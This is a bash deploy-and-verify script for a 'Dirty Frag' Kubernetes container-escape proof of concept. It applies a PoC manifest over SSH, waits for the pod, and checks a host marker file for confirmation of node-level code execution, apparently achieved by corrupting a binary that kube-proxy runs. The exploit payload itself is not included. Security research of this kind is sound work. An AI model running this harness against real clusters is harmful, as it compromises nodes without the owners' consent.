#!/usr/bin/env bash
set -euo pipefail

# Dirty Frag Kubernetes PoC — deploy and verify
#
# Requires: kubectl configured to reach the cluster, and setup-eks.sh
# already run so the image is available on the node.

NODE="${1:?Usage: $0 <user@node-ip>}"
KUBECTL="ssh ${NODE} sudo /root/bin/kubectl"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
MANIFEST="$SCRIPT_DIR/../deploy/poc-eks.yaml"

echo "[*] Deploying PoC pod ..."
cat "$MANIFEST" | ssh "$NODE" "sudo /root/bin/kubectl apply -f -"

echo "[*] Waiting for pod to become Ready (up to 120s) ..."
$KUBECTL wait --for=condition=Available deployment/dirtyfrag-poc-eks \
    --timeout=120s 2>/dev/null || true
sleep 5

echo "[*] PoC pod logs:"
$KUBECTL logs deployment/dirtyfrag-poc-eks --tail=50 2>/dev/null || true

echo ""
echo "[*] Checking for escape marker on host ..."
sleep 30
RESULT=$(ssh "$NODE" "sudo cat /root/res 2>/dev/null" || echo "NOT FOUND")
echo "    /root/res => ${RESULT}"

if [ "$RESULT" = "[*] success" ]; then
    echo ""
    echo "[+] CONTAINER ESCAPE CONFIRMED — node-level code execution achieved"
else
    echo ""
    echo "[-] Marker not (yet) found. kube-proxy may need more time to"
    echo "    execute the corrupted binary. Re-run after a few minutes or"
    echo "    trigger iptables reconciliation manually."
fi
